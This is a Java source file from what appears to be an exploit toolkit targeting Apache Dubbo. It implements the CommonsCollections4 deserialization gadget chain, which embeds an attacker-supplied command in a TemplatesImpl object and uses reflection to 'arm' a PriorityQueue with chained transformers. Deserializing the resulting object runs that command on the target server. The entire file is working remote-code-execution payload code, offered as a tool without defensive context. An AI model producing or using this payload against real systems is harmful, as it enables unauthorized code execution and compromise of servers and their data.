package com.threedr3am.exp.dubbo.payload.java;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.util.PriorityQueue;
import javax.xml.transform.Templates;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

/**
 * commons-collections:commons-collections:3.1
 */
public class CommonsCollections4 implements Payload {

	private String[] args;

	/**
	 *
	 * @param args
	 *
	 * arg[0]=cmd
	 *
	 * @return
	 * @throws Exception
	 */
	@Override
	public Object getPayload(String[] args) throws Exception {
		if (this.args != null)
			args = this.args;
		Object templates = Gadgets.createTemplatesImpl(args[0]);

		ConstantTransformer constant = new ConstantTransformer(String.class);

		// mock method name until armed
		Class[] paramTypes = new Class[] { String.class };
		Object[] argsx = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(
				paramTypes, argsx);

		// grab defensively copied arrays
		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
		argsx = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

		// create queue with numbers
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// swap in values to arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		argsx[0] = templates;

		return queue;
	}

	@Override
	public void injectDefaultArgs(String[] args) {
		this.args = args;
	}

}
